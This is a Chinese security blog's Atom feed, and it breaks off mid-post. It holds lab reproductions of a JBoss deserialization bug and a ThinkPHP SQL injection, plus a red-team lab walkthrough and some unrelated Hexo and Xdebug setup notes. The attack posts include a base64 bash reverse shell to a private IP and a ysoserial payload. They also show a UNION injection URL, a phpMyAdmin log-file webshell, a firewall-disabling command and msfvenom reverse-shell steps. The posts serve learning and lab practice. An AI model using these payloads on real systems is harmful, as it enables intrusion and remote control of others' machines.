<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>白仁的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bai-ren-1.github.io/"/>
  <updated>2021-06-14T12:14:08.908Z</updated>
  <id>http://bai-ren-1.github.io/</id>
  
  <author>
    <name>白仁</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Jboss反序列化</title>
    <link href="http://bai-ren-1.github.io/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://bai-ren-1.github.io/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-06-14T10:32:14.000Z</published>
    <updated>2021-06-14T12:14:08.908Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Jboss反序列化"><a href="#Jboss反序列化" class="headerlink" title="Jboss反序列化"></a>Jboss反序列化</h1><p>记录记录。</p><h2 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h2><p>直接使用Vulhub环境搭建即可，方便快捷。<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p><h2 id="0x01-CVE-2017-12149"><a href="#0x01-CVE-2017-12149" class="headerlink" title="0x01 CVE-2017-12149"></a>0x01 CVE-2017-12149</h2><h3 id="00-启动环境"><a href="#00-启动环境" class="headerlink" title="00 启动环境"></a>00 启动环境</h3><p>进入到目录中，使用docker开启环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /vulhub/jboss/CVE-2017-12149</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt></p><p>访问靶机的8080端口能看到一下界面说明开启成功。</p><h3 id="01-Payload准备"><a href="#01-Payload准备" class="headerlink" title="01 Payload准备"></a>01 Payload准备</h3><p>我们使用bash来反弹shell，但由于Runtime.getRuntime().exec()中执行的符号与bash命令可能有差别：</p><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt></p><p>因此可以通过使用编码进行转换处理，实现网站：<a href="http://jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://jackson-t.ca/runtime-exec-payloads.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.3.87/7777 0&gt;&amp;1</span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuODcvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt></p><p>然后通过ysoserial工具，生成最终的反序列化攻击Payload。因为Vulhub环境较新，使用CommonsCollections6的Gadget来生成我们的最终Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ./ysoserial.jar CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuODcvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; 1.ser</span><br></pre></td></tr></table></figure><p>在相同目录下生成的1.ser就是我们得到的反序列化攻击的Payload</p><h3 id="02-反序列化攻击"><a href="#02-反序列化攻击" class="headerlink" title="02 反序列化攻击"></a>02 反序列化攻击</h3><p>CVE-2017-12149是出现在/invoker/readonly请求中，服务器会将用户提交的POST内容进行Java反序列化，从而造成攻击。使用BP抓取/invoker/readonly的请求，在POST主体处右键点击”Paste from file“选择1.ser，然后把HTTP请求方式修改未POST：</p><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt></p><p>在攻击机准备好监听端口，使用nc监听本机的7777端口：</p><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" alt></p><p>然后BP发包，靶机的Jboss就会对POST内容进行反序列化，从而执行反弹shell的命令。我们在攻击机上就能收到反弹的shell：</p><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt></p><p>至此CVE-2017-12149复现成功，记得关闭docker环境：</p><p><img src="/2021/06/14/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt></p><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>以后再补充其他Jboss的漏洞复现。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Jboss反序列化&quot;&gt;&lt;a href=&quot;#Jboss反序列化&quot; class=&quot;headerlink&quot; title=&quot;Jboss反序列化&quot;&gt;&lt;/a&gt;Jboss反序列化&lt;/h1&gt;&lt;p&gt;记录记录。&lt;/p&gt;
&lt;h2 id=&quot;0x00-环境搭建&quot;&gt;&lt;a href=&quot;#0x0
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>1DAY挖掘经验之通达OAPatch分析</title>
    <link href="http://bai-ren-1.github.io/2021/06/10/1DAY%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E9%80%9A%E8%BE%BEOAPatch%E5%88%86%E6%9E%90/"/>
    <id>http://bai-ren-1.github.io/2021/06/10/1DAY%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E9%80%9A%E8%BE%BEOAPatch%E5%88%86%E6%9E%90/</id>
    <published>2021-06-10T08:18:12.000Z</published>
    <updated>2021-06-14T10:31:44.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1DAY挖掘经验之通达OAPatch分析"><a href="#1DAY挖掘经验之通达OAPatch分析" class="headerlink" title="1DAY挖掘经验之通达OAPatch分析"></a>1DAY挖掘经验之通达OAPatch分析</h1><p>看到写的这篇文章真的好，特来复现学习一番。<a href="https://www.anquanke.com/post/id/210395#h2-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/210395#h2-3</a></p><h2 id="0x00-前期准备"><a href="#0x00-前期准备" class="headerlink" title="0x00 前期准备"></a>0x00 前期准备</h2><p>假设看到通达OA的官网的补丁更新。<a href="https://www.tongda2000.com/news/p673.php。则可以根据披露的漏洞大致信息，通过diff打补丁的代码定位到代码变化，从而找到漏洞细节。" target="_blank" rel="noopener">https://www.tongda2000.com/news/p673.php。则可以根据披露的漏洞大致信息，通过diff打补丁的代码定位到代码变化，从而找到漏洞细节。</a></p><blockquote><p>日期: 2020.03.13<br>任意文件上传 影响版本: &lt;=v11<br>任意文件包含,影响版本: =v11</p></blockquote><ul><li>DiffMerge - 对比代码</li><li>SeayDzend - 解密通达OA的加密代码</li><li>通达OA v11.3 - 未Patch漏洞版本</li><li>通达OA补丁  2020_A1.11.3 - Patch</li></ul><h2 id="0x01-解密和对比"><a href="#0x01-解密和对比" class="headerlink" title="0x01 解密和对比"></a>0x01 解密和对比</h2><p>直接安装通达OA v11.3，然后将安装目录中的webroot文件夹copy到外面作为未patch的版本。随后安装通达OA补丁，再将安装过补丁后的webroot文件夹copy到外面作为patch过的版本。随便点开一个文件可见是Zend加密过的PHP代码，我们需要对其进行解密：</p><p><img src="/2021/06/10/1DAY%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E9%80%9A%E8%BE%BEOAPatch%E5%88%86%E6%9E%90/1.png" alt></p><p>使用SeayDzend解密加密过的代码，文件比较多等待时间会比较长：</p><p><img src="/2021/06/10/1DAY%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E9%80%9A%E8%BE%BEOAPatch%E5%88%86%E6%9E%90/2.png" alt></p><p>使用DiffMerge对比打了Patch前后产生变化的代码文件，然后不断跟进看是否是漏洞相关的代码：</p><p><img src="/2021/06/10/1DAY%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C%E4%B9%8B%E9%80%9A%E8%BE%BEOAPatch%E5%88%86%E6%9E%90/3.png" alt></p><blockquote><p>DiffMerge打开文件时候会因为中文而有编码问题。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1DAY挖掘经验之通达OAPatch分析&quot;&gt;&lt;a href=&quot;#1DAY挖掘经验之通达OAPatch分析&quot; class=&quot;headerlink&quot; title=&quot;1DAY挖掘经验之通达OAPatch分析&quot;&gt;&lt;/a&gt;1DAY挖掘经验之通达OAPatch分析&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Hexo报错</title>
    <link href="http://bai-ren-1.github.io/2021/06/08/Hexo%E6%8A%A5%E9%94%99/"/>
    <id>http://bai-ren-1.github.io/2021/06/08/Hexo%E6%8A%A5%E9%94%99/</id>
    <published>2021-06-08T05:56:52.000Z</published>
    <updated>2021-06-08T06:02:05.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo报错"><a href="#Hexo报错" class="headerlink" title="Hexo报错"></a>Hexo报错</h1><h2 id="0x00-Unknown-SSL-protocol-error"><a href="#0x00-Unknown-SSL-protocol-error" class="headerlink" title="0x00 Unknown SSL protocol error"></a>0x00 Unknown SSL protocol error</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal: unable to access &apos;https://github.com/bai-ren-1/bai-ren-1.github.io.git/&apos;:        Unknown SSL protocol error in connection to github.com:443</span><br></pre></td></tr></table></figure><p>参考网上文章然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset http.proxy </span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure><h2 id="0x01-Failed-to-connect"><a href="#0x01-Failed-to-connect" class="headerlink" title="0x01 Failed to connect"></a>0x01 Failed to connect</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal: unable to access &apos;https://github.com/bai-ren-1/bai-ren-1.github.io.git/&apos;: Failed to connect to github.com port 443: Timed out</span><br></pre></td></tr></table></figure><p>看起来就是连接问题，直接加个代理。找到用户目录下的.gitconfig文件，添加代理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[http]</span><br><span class="line">proxy = 127.0.0.1:1080/</span><br></pre></td></tr></table></figure><p>重新push即可成功</p><h2 id="0x02-展望"><a href="#0x02-展望" class="headerlink" title="0x02 展望"></a>0x02 展望</h2><p>以后还有其他坑再补齐。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Hexo报错&quot;&gt;&lt;a href=&quot;#Hexo报错&quot; class=&quot;headerlink&quot; title=&quot;Hexo报错&quot;&gt;&lt;/a&gt;Hexo报错&lt;/h1&gt;&lt;h2 id=&quot;0x00-Unknown-SSL-protocol-error&quot;&gt;&lt;a href=&quot;#0x00-U
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>PHPStorm结合Wampserver调试</title>
    <link href="http://bai-ren-1.github.io/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/"/>
    <id>http://bai-ren-1.github.io/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/</id>
    <published>2021-06-08T02:21:45.000Z</published>
    <updated>2021-06-08T05:45:00.921Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHPStorm结合Wampserver调试"><a href="#PHPStorm结合Wampserver调试" class="headerlink" title="PHPStorm结合Wampserver调试"></a>PHPStorm结合Wampserver调试</h1><p>记录一下如何使用PHPStorm和Wampserver结合来调试代码，便于审计。</p><h2 id="0x00-环境配置"><a href="#0x00-环境配置" class="headerlink" title="0x00 环境配置"></a>0x00 环境配置</h2><ul><li>PHPStorm v.2018.3.5</li><li>Wampserver v.3.2.3</li><li>Xdebug helper v.1.6.1</li></ul><h2 id="0x01-配置过程"><a href="#0x01-配置过程" class="headerlink" title="0x01 配置过程"></a>0x01 配置过程</h2><h3 id="00-CMS搭建"><a href="#00-CMS搭建" class="headerlink" title="00 CMS搭建"></a>00 CMS搭建</h3><p>这部分没什么好说的，选择lfdycms作为我的cms选择。直接拉到www目录下面，添加虚拟地址方便访问：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/1.png" alt></p><p>上面画绿框的ServerName就是我添加的虚拟地址，这样访问<a href="http://www.lfdycms.com就能访问到本地搭建的环境。" target="_blank" rel="noopener">www.lfdycms.com就能访问到本地搭建的环境。</a></p><h3 id="01-Wampserver配置"><a href="#01-Wampserver配置" class="headerlink" title="01 Wampserver配置"></a>01 Wampserver配置</h3><p>Wampserver里面是自动集成了Xdebug插件，我们可以在php.ini文件中开启并进行配置：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/2.png" alt></p><p>把enable设置为1开启，并在下面添加一些配置信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xdebug.idekey=PhpStorm  </span><br><span class="line">xdebug.remote_enable = On  </span><br><span class="line">xdebug.remote_host=localhost  </span><br><span class="line">xdebug.remote_port=9000  </span><br><span class="line">xdebug.remote_handler=dbgp</span><br></pre></td></tr></table></figure><p>添加信息后重启Wampserver让配置信息生效。重启后可以到localhost下查看phpinfo确认是否开启了Xdebug：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/3.png" alt></p><h3 id="02-PHPStorm配置"><a href="#02-PHPStorm配置" class="headerlink" title="02 PHPStorm配置"></a>02 PHPStorm配置</h3><p>首先选择File-&gt;Settings-&gt;Languages&amp;Frame Works-&gt;Php-&gt;Servers，配置服务器信息：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/4.png" alt></p><p>其次选择 File-&gt;Settings-&gt;Languages&amp;Frame Works-&gt;Php-&gt;Debug-&gt;DBGp Proxy 配置代理信息：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/5.png" alt></p><p>最后选择 File-&gt;Settings-&gt;Languages&amp;Frame Works-&gt;Php-Debug 找到右边窗口对应的debug设置，把端口改成9000，配置内容如下图所示： </p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/6.png" alt></p><h2 id="0x02-调试过程"><a href="#0x02-调试过程" class="headerlink" title="0x02 调试过程"></a>0x02 调试过程</h2><h3 id="00-开启Xdebug-helper"><a href="#00-开启Xdebug-helper" class="headerlink" title="00 开启Xdebug helper"></a>00 开启Xdebug helper</h3><p>首先点击Xdebug helper右上角的小虫子的Debug开启Debug功能：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/7.png" alt></p><h3 id="01-代码断点"><a href="#01-代码断点" class="headerlink" title="01 代码断点"></a>01 代码断点</h3><p>打开www目录中的源代码，随便下一个断点：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/8.png" alt></p><p>然后点击右上角的Debug开关，然后运行Debug功能：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/9.png" alt></p><p>访问服务器网站，代码运行到断点位置：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/10.png" alt></p><h2 id="0x03-调试lfdycms"><a href="#0x03-调试lfdycms" class="headerlink" title="0x03 调试lfdycms"></a>0x03 调试lfdycms</h2><p>lfdycms框架基于ThinkPHP 3.2.3开发，而ThinkPHP 3.2.3中find等方法存在SQL注入漏洞：<a href="https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/#toc-heading-4，因此，可以寻找lfdycms中调用了find方法来挖掘SQL注入漏洞。通过访问下面url触发MovieController中的方法：" target="_blank" rel="noopener">https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/#toc-heading-4，因此，可以寻找lfdycms中调用了find方法来挖掘SQL注入漏洞。通过访问下面url触发MovieController中的方法：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php/Home/Movie/index/?id[where]=0%20union%20select%201,2,database(),(select%20%20version()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27%20-</span><br></pre></td></tr></table></figure><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/11.png" alt></p><p>可以看到id就是我们的GET参数，其值是由我们控制的注入payload，往下跟进进入detail看如何处理id变量：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/12.png" alt></p><p>可见在MovieModel中是通过ThinkPHP的find方法进行SQL查询，故存在SQL注入漏洞。</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/13.png" alt></p><p>把代码流程走完即可模板生成后即可在浏览器看到回显的数据：</p><p><img src="/2021/06/08/PHPStorm%E7%BB%93%E5%90%88Wampserver%E8%B0%83%E8%AF%95/14.png" alt></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>记录进步。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHPStorm结合Wampserver调试&quot;&gt;&lt;a href=&quot;#PHPStorm结合Wampserver调试&quot; class=&quot;headerlink&quot; title=&quot;PHPStorm结合Wampserver调试&quot;&gt;&lt;/a&gt;PHPStorm结合Wampserver
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>红队靶场评估-1</title>
    <link href="http://bai-ren-1.github.io/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/"/>
    <id>http://bai-ren-1.github.io/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/</id>
    <published>2020-12-27T04:14:24.000Z</published>
    <updated>2020-12-28T02:46:54.861Z</updated>
    
    <content type="html"><![CDATA[<h1 id="红队靶场评估-1"><a href="#红队靶场评估-1" class="headerlink" title="红队靶场评估-1"></a>红队靶场评估-1</h1><p>学习学习，记录记录。感谢红日安全团队：<a href="http://vulnstack.qiyuanxuetang.net/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/</a></p><h2 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h2><p>使用VM划分不同的网段，VMnet1：192.168.52.0/24为外网；VMnet2：192.168.72.0/24为内网：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/1-vm%E7%BD%91%E7%BB%9C.png" alt></p><p>给跳板机windows7添加多一个网络适配器，设置为以下靶场信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">windows7 - 外网ip:192.168.52.143 + 内网ip:192.168.72.110 - Web服务器</span><br><span class="line">windows server 2003 - 内网ip:192.168.72.141 - 域成员机器</span><br><span class="line">windows server 2008 - 内网ip:192.168.72.138 - 域控</span><br></pre></td></tr></table></figure><p>攻击机信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kali - 外网ip：192.168.52.128 - 渗透机</span><br></pre></td></tr></table></figure><h2 id="0x01-渗透Web服务器"><a href="#0x01-渗透Web服务器" class="headerlink" title="0x01 渗透Web服务器"></a>0x01 渗透Web服务器</h2><h3 id="00-端口扫描"><a href="#00-端口扫描" class="headerlink" title="00 端口扫描"></a>00 端口扫描</h3><p>首先使用nmap对Web服务器进行全端口扫描：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A -n -T4 -p- <span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">143</span></span><br></pre></td></tr></table></figure><p>扫描出Web服务器的开放端口有80和3306：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/2-%E6%89%ABweb%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%8F%A3.png" alt></p><h3 id="01-目录扫描"><a href="#01-目录扫描" class="headerlink" title="01 目录扫描"></a>01 目录扫描</h3><p>首先从80端口Web服务进行渗透，使用dirsearch进行目录扫描：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./dirsearch.py -u <span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">143</span> -e php</span><br></pre></td></tr></table></figure><p>扫描后得到几个敏感路径：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/3-%E6%89%AB%E6%8F%8Fweb%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3.png" alt></p><p>尝试在浏览器访问l.php，原来是探针文件。这样就得到了phpstudy的绝对路径等信息：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/4-web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A2%E9%92%88.png" alt></p><h3 id="02-phpmyadmin写shell"><a href="#02-phpmyadmin写shell" class="headerlink" title="02 phpmyadmin写shell"></a>02 phpmyadmin写shell</h3><p>访问phpmyadmin，弱口令root/root登入后台：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/5.png" alt></p><p>使用命令查询是否开启secure_file_priv：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%secure_file%&apos;;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/7.png" alt></p><blockquote><p>secure_file_priv 值为 NULL，不能使用 into outfile 方式写入 shell</p></blockquote><p>转变思路，使用命令查询是否开启了日志功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%general%&apos;;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/6.png" alt></p><p>没有开启日志功能，我们使用下面命令开启并且指定日志文件，配合探针获取的绝对路径写入shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = on;</span><br><span class="line">show variables like &apos;%general%&apos;;</span><br><span class="line">set global general_log_file = &apos;C:/phpstudy_pro/WWW/1.php&apos;; </span><br><span class="line">select &apos;&lt;?php eval($_POST[bairen]);?&gt;&apos;;</span><br></pre></td></tr></table></figure><p>执行成功！既查询后开启了日志功能，同时指定日志文件是C:/phpstudy_pro/WWW/1.php：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/8.png" alt></p><h3 id="03-连接Webshell"><a href="#03-连接Webshell" class="headerlink" title="03 连接Webshell"></a>03 连接Webshell</h3><p>使用蚁剑连接到写入的1.php一句话，连接成功：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/9.png" alt></p><p>我们可以看到通过日志功能写的1.php虽然有其他内容，但并不影响执行eval：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/10.png" alt></p><h3 id="04-shell传递"><a href="#04-shell传递" class="headerlink" title="04 shell传递"></a>04 shell传递</h3><h4 id="001-转为CS的shell"><a href="#001-转为CS的shell" class="headerlink" title="001 转为CS的shell"></a>001 转为CS的shell</h4><p>首先在kali上启动teamserver：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.52.128 123456</span><br></pre></td></tr></table></figure><blockquote><p>CS的Beacon时常会执行不了命令，或者beacon断开连接，此时需要重新开启teamserver。</p></blockquote><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/11.png" alt></p><p>因为都是在自己搭建的网络环境，这里直接使用kali作为客户端连接teamserver。然后开启一个http监听：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/13.png" alt></p><p>有蚁剑的shell上传很方便，所以选择生成可执行二进制文件作为我们的木马：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/12.png" alt></p><p>选择我们刚才的监听器，生成木马，保存为bairenmuma.exe：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/14.png" alt></p><p>然后我们使用蚁剑上传我们刚生成的木马。在上传之前先关闭防火墙功能，免得被Web服务器管理员所看到：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/15.png" alt></p><p>上传木马并执行，就能在CS中上线，即把蚁剑的shell转到了CS中：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/16.png" alt></p><p>其他CS上线方式可以参考：<a href="https://www.freebuf.com/articles/web/252594.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/252594.html</a></p><h4 id="002-转为MSF的shell"><a href="#002-转为MSF的shell" class="headerlink" title="002 转为MSF的shell"></a>002 转为MSF的shell</h4><p>直接使用msfconsole命令进行msf，然后使用msfvenom生成木马</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">128</span> lport=<span class="number">6666</span> -f exe&gt;bairenmsf.exe</span><br></pre></td></tr></table></figure><p>在msf中执行监听，命令如下：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">128</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">6666</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>使用蚁剑将msf的木马上传并且执行，就能在msf收到shell：</p><p><img src="/2020/12/27/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E8%AF%84%E4%BC%B0-1/17.png" alt></p><h2 id="0x02-渗透域服务器"><a href="#0x02-渗透域服务器" class="headerlink" title="0x02 渗透域服务器"></a>0x02 渗透域服务器</h2><h3 id="00-信息收集"><a href="#00-信息收集" class="headerlink" title="00 信息收集"></a>00 信息收集</h3><h4 id="001-本机信息收集"><a href="#001-本机信息收集" class="headerlink" title="001 